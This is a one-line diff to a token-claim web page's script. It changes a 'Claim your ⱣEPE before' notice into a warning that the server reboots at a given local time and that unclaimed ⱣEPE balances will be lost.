@@ -125,7 +125,7 @@
       var formattedLocalTime = localTime.toLocaleTimeString([], options);
 
       // Update the paragraph with the local time
-      document.getElementById('claim-time').innerHTML = 'Claim your ⱣEPE before ' + formattedLocalTime + '!';
+      document.getElementById('claim-time').innerHTML = 'Server reboots at ' + formattedLocalTime + '! This means that you will lose your ⱣEPE balance';
 
       document.getElementById('payout-form').addEventListener('submit', function (event) {
          var walletAddress = document.getElementById('wallet').value;
